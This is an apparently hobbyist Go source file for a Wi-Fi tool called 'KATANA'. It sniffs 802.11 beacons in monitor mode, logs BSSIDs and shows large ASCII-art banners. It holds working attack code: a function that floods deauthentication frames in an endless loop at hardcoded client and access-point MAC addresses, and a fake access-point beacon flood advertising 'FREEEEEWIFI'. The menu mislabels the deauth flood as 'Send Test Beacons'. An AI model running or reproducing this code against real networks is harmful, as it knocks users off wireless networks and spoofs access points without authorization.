package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
	//"io/ioutil"

	"github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/guptarohit/asciigraph"
	"github.com/schollz/progressbar"
	"gopkg.in/AlecAivazis/survey.v1"
)

var (
	device       string = "wlx00c0caa8a5a3"
	snapshot_len int32  = 1024
	promiscuous  bool   = true
	err          error
	timeout      time.Duration = 1 * time.Second
	handle       *pcap.Handle
	counter      int32 = 0
	buffer       gopacket.SerializeBuffer
  	options      gopacket.SerializeOptions
	chartslice 	 []float64
	averageSignalRate int32 = 0
	openFlags      = 1057
	wpaFlags       = 1041
	durationID     = uint16(0x013a)
	capabilityInfo = uint16(0x0411)
	listenInterval = uint16(3)
	fakeApRates  = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01}
	fakeApWpaRSN = []byte{
		0x01, 0x00, // RSN Version 1
		0x00, 0x0f, 0xac, 0x02, // Group Cipher Suite : 00-0f-ac TKIP
		0x02, 0x00, // 2 Pairwise Cipher Suites (next two lines)
		0x00, 0x0f, 0xac, 0x04, // AES Cipher / CCMP
		0x00, 0x0f, 0xac, 0x02, // TKIP Cipher
		0x01, 0x00, // 1 Authentication Key Management Suite (line below)
		0x00, 0x0f, 0xac, 0x02, // Pre-Shared Key
		0x00, 0x00,
	}
	wpaSignatureBytes = []byte{0, 0x50, 0xf2, 1}

	assocRates        = []byte{0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c}
	assocESRates      = []byte{0x0C, 0x12, 0x18, 0x60}
	assocRSNInfo      = []byte{0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, 0x8C, 0x00}
	assocCapabilities = []byte{0x2C, 0x01, 0x03, 0xFF, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
)

// DEAUTH ---------------------------------------------------------------------------------------------
var SerializationOptions = gopacket.SerializeOptions{
	FixLengths:       true,
	ComputeChecksums: true,
}

func Serialize(layers ...gopacket.SerializableLayer) (error, []byte) {
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, SerializationOptions, layers...); err != nil {
		return err, nil
	}
	return nil, buf.Bytes()
}

func NewDot11Deauth() (error, []byte) {

	handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
    if err != nil {log.Fatal(err)}
    defer handle.Close()
	
	radio_layer := &layers.RadioTap{
		DBMAntennaSignal: int8(-10),
		ChannelFrequency: layers.RadioTapChannelFrequency(2412),
	}
	dot11_layer := &layers.Dot11{
		Address1: net.HardwareAddr{0x60,0xD0,0x2C,0x3C,0x10,0xC8},
		Address2: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
		Address3: net.HardwareAddr{0x48,0xd2,0x24,0x1a,0xcb,0xe8},
		Type: layers.Dot11TypeMgmtDeauthentication,
	}
	auth_layer := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11ReasonClass2FromNonAuth,
	}
	
	buffer = gopacket.NewSerializeBuffer()
    gopacket.SerializeLayers(
      buffer,
      options,
      radio_layer,
      dot11_layer,
      auth_layer,
    )

	outgoingPacket := buffer.Bytes()

    for {
	err = handle.WritePacketData(outgoingPacket)
	fmt.Print(".")
	if err != nil {
	log.Fatal(err)
	}
  }
}
// DEAUTH --------------------------------------------------------------------------------------------


func send_beacons() {
	flags := openFlags

    //Need high TX card with Atheros chip such as TP-Link
    handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
    if err != nil {log.Fatal(err)}
    defer handle.Close()

    radioLayer := &layers.RadioTap{
    	DBMAntennaSignal: int8(-10),
    	ChannelFrequency: layers.RadioTapChannelFrequency(2412),
    }

    dot11CoreLayer := &layers.Dot11{
    Address1: net.HardwareAddr{0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    Address2: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
    Address3: net.HardwareAddr{0x60,0xde,0xCA,0xAB,0xFC,0xda},
    Type: 0x08,
    }

    dot11BeaconLayer := &layers.Dot11MgmtBeacon{
    		Flags: uint16(flags),
			Interval: 1000,
		}

    buffer = gopacket.NewSerializeBuffer()
    gopacket.SerializeLayers(
      buffer,
      options,
      radioLayer,
      dot11CoreLayer,
      dot11BeaconLayer,
      Dot11Info(layers.Dot11InformationElementIDSSID, []byte("FREEEEEWIFI")),
      Dot11Info(layers.Dot11InformationElementIDRates, fakeApRates),
    )
    outgoingPacket := buffer.Bytes()

     for {
	err = handle.WritePacketData(outgoingPacket)
	fmt.Print(".")
	if err != nil {
	log.Fatal(err)
	}
  }
}


type Dot11ApConfig struct {
	SSID       string
	BSSID      net.HardwareAddr
	Channel    int
	Encryption bool
}



func Dot11Info(id layers.Dot11InformationElementID, info []byte) *layers.Dot11InformationElement {
	return &layers.Dot11InformationElement{
		ID:     id,
		Length: uint8(len(info) & 0xff),
		Info:   info,
	}
}


func main() {


	rotate()

	addrs, err := net.InterfaceAddrs()

	if err != nil {
		os.Stderr.WriteString("There was an error: " + err.Error() + "\n")
		os.Exit(1)
	}

	print_interfaces := exec.Command("iwconfig | grep -w Monitor")
	print_interfaces.Stdout = os.Stdout
	print_interfaces.Run()

	fmt.Println("__________________________________________________________________________")
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To16() != nil {

				os.Stdout.WriteString("\nAddress assigned to network interface: " + ipnet.IP.String() + "\n")
			}
		}
	}

	fmt.Println("__________________________________________________________________________")

	option_select := ""
	prompt := &survey.Select{
		Message: "\n",
		Options: []string{"Start Monitor", "Show beacon statistics", "Send Test Beacons", "Print RTap-Power Chart", "Observe Average Power Rates"},
	}

	fmt.Print("\n")
	survey.AskOne(prompt, &option_select, nil)

	if option_select == "Start Monitor" {
		fmt.Println("Press key to begin...")
		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)

		if err != nil {
			log.Fatal(err)
		}

		defer handle.Close()
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			display_beacons(packet)
		}

	}

	if option_select == "Show beacon statistics" {
		fmt.Println("Here are the statistics:")
		os.Exit(3)
	}

	if option_select == "Send Test Beacons" {
		fmt.Println("Starting...")
		NewDot11Deauth()
	}

	if option_select == "Print RTap-Power Chart" {
		printAChart()
	}

	if option_select == "Observe Average Power Rates" {
		handle, err = pcap.OpenLive(device, snapshot_len, promiscuous, timeout)

	if err != nil {
		log.Fatal(err)
	}


	defer handle.Close()
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
			display_average_power(packet)
		}
	}

//end main()
}


func display_beacons(packet gopacket.Packet) {

	f, err := os.OpenFile("katana.txt", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed: %s", err)
	}
	defer f.Close()

	dot11Information := packet.Layer(layers.LayerTypeDot11)
	//dot11elementInformation := packet.Layer(layers.LayerTypeDot11InformationElement)
	radioInformation := packet.Layer(layers.LayerTypeRadioTap)

	//DOT11 ADDR INFORMATION
	if dot11Information != nil || radioInformation != nil {

		dot11Information, _ := dot11Information.(*layers.Dot11)
		//dot11elementInformation, _ := dot11elementInformation.(*layers.Dot11InformationElement)
		radioInformation, _ := radioInformation.(*layers.RadioTap)

		counter += 1

		fmt.Print("\u001b[37mStation: \u001b[32m", dot11Information.Address3,
			" \u001b[37mDestination: \u001b[32m", dot11Information.Address1,
			" \u001b[37mData: \u001b[33m", dot11Information.Type,
			" \u001b[37mSequenceNumber: \u001b[33m", dot11Information.SequenceNumber,
			" \u001b[37mFrequency: \u001b[34m", radioInformation.ChannelFrequency,
			" \u001b[37mDBM Antenna Signal: \u001b[34m", radioInformation.DBMAntennaSignal,
			" \u001b[37mRate: \u001b[33m", radioInformation.Rate,
			" \u001b[37mTX Attenuation: \u001b[35m", radioInformation.TxAttenuation,
			" \u001b[37mDBTx Attenuation: \u001b[35m", radioInformation.DBTxAttenuation,
			" \u001b[37mDBMTxPower: \u001b[35m", radioInformation.DBMTxPower,
			" \u001b[37mAntenna: \u001b[35m", radioInformation.Antenna, " \u001b[31m Beacons Captured: ", counter) 
			//"ESSID: ", dot11elementInformation.Info)

		if dot11Information.Address3 != nil {
			fmt.Fprintln(f, dot11Information.Address3)
		}

		fmt.Println("")
	}

}

func display_average_power(packet gopacket.Packet) {
	radioInformation := packet.Layer(layers.LayerTypeRadioTap)
	if radioInformation != nil {
		radioInformation, _ := radioInformation.(*layers.RadioTap)
		fmt.Print("\u001b[37mAntenna Signal: \u001b[34m", radioInformation.DBMAntennaSignal, "\n")
	}

}


func printAChart() {

	//Develop
	graph := asciigraph.Plot(chartslice)
	fmt.Println(graph)
}




func printA() {

	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork()
}


func printB() {
	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork2()
}


func printC() {
	clearscreen := exec.Command("clear")
	clearscreen.Stdout = os.Stdout
	clearscreen.Run()
	print_artwork3()

}


func rotate() {
	for {
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(50 * time.Millisecond)
		printB()
		time.Sleep(50 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(50 * time.Millisecond)
		printA()
		time.Sleep(100 * time.Millisecond)
		printB()
		time.Sleep(100 * time.Millisecond)
		printC()
		time.Sleep(100 * time.Millisecond)
		fmt.Println("\n")
		clearscreen2 := exec.Command("clear")
		clearscreen2.Stdout = os.Stdout
		clearscreen2.Run()
		color.Red("\nKATANA LOADING...\n")
		fmt.Println("\n")
		bar := progressbar.New(100)
		for i := 0; i < 100; i++ {
			bar.Add(1)
			time.Sleep(5 * time.Millisecond)
		}
		clearscreen := exec.Command("clear")
		clearscreen.Stdout = os.Stdout
		clearscreen.Run()
		break
	}
}


func print_artwork() {
	color.Blue(`


                                          KATANA

                                      ://oyydmmho++/--.
                                     soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+/
                                   ---./dmdhyso+/:--.---
                                      -:yhhdmmdo:.--   -.-
                                       -sNNmdmmm/ -     ---
                                         /dMMMMM: -.   -. .     :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}

func print_artwork2() {
	color.Green(`


                                          KATANA

                                      ://oyydmmho++/--.
                                     soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+/
                                   ---./dmdhyso+/:--.---
                                      -:yhhdmmdo:.--   -.-
                                       -sNNmdmmm/ -     ---
                                         /dMMMMM: -.   -. .     :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}

func print_artwork3() {
	color.Red(`
                              /
                               /
                                /
                                 /        KATANA
                                  /
                                   /  ://oyydmmho++/--.
                                    /soyNNNMMNNNho++--
                                     sNNhyyNNMMMNm+.-./.
                                    sNMNys:+NMMNdoo+-/oys+-
                                  :shMMMMs-hdNmo/+/+yhmds-
                                   .NMMMMNdMssos-shhmNNMNm+.
                                  -ydMMMMNohs--: /yoNNMs+oo--
                                  --shMMMN:-d--..---oMMh--
                                ----..mNMMNdNyoo/- -+Msys:- ----
                             -.-   --.shdMMMMMdmms.:mMd:-++/-   --
                             -.    -.-/hdhhhddddmNh+/ymh. -:+--   --
                              -.-     -sdyo+::.:-:/s/--:/-  -.    ---
                                ----  :ohddhhh/-...-+  /
                                   ---./dmdhyso+/:--.--- /
                                      -:yhhdmmdo:.--   -.- /
                                       -sNNmdmmm/ -     --- /
                                         /dMMMMM: -.   -. .   /   :/-
                                          -+mMMMy/:.   .-::    :dy/.---
                                            -sNMMNN-   -.:-     :o: .o/:
                                              -dNMM-    : -   --s-  -:dm.
                                               -yNMs    h---.:::-.ossdNh-
                                               -+MMN-   :--    .soo/.mm-
                                               sdMMM/       --.:-   .o.
                                              .MMMMNd++o+-.- :-
                                              :MMMNMNmmds/o-.---
                                              +MMmsMNmNd:-    -:-
                                              oMMNmMMs...---:+/so.
                                              +MMMMMMm:     -//+Nmo.
                                              :dMMMMMd/:-    ::+mMMm+-
                                             --/mMMMMhy/     --+dMMMMd-
                                            -:.-+MMMMN-./-    -.hMMMMMN+
                                            :.--:dMMMMd  .--   -:mMMMMMMs
                                           .--...oMMMMM+   -    -:mMMMMMMs
                                           /--:..:dMMMMm          -dMMMMMMs
                                          --  -.-:/NMMMMo          .hMMMMMN/
                                         -.      -:yMMMMN.     :    -+hmMMMN:
                                         -      -. /NMMMMs     -:.    ...:+yd-
                                        -      ..  .oMMMMN-     ./y.   .-   ./
                                      ..      ..    -mMMMM+      -NNo-  -.    -
                                    -.       --     -oMMMMd       sMMm+-.:--
                                   .-      ---       -hMMMM-      .NMMNy:.--
                                 .:--     -.         -+MMMM+ -     dMNy-
                                .mNmdyo.- .           -mMMNo:.--..-yo:-
                                hMMMMMo---            -sMN+. --   --
                               .dMMMMN:  .            -/Ns-   -
                              :oyMMMdo+o-            -//s/--- -
                             :NhNMMMdy-:-            +NNoNN/---
                             hNmMMMMNho.             sMMNMM:  -
                             yNMMMMMm.--             /mMMMm+/--
                             +MMNNhho-.             -yhMMM+-.-
                            .mMMh:-+o.              yMmMMNhN-.-
                            yMMh- -                 hNNMMMNd/:-
                           /NNd+ -                  +dNMMNyh..
                         .+mNN:.:-                   sMMNh/y+-
                        .mMN++. -                    yMMh/-.
                       :hmdm+---.                   -NMM+ .
                       yNMs:..----                  +MMN+ -
                       -smNMN:.-:-.                 NMMN:-:..
                          sMMm/-h..                -dNNh.   --.
                          -odNms:..                :hyy... .-y:
                             -:+o+-                sMMM+:.--+o:
                                                   mMNms/.:--.
                                                   /osy-.--
`)
}
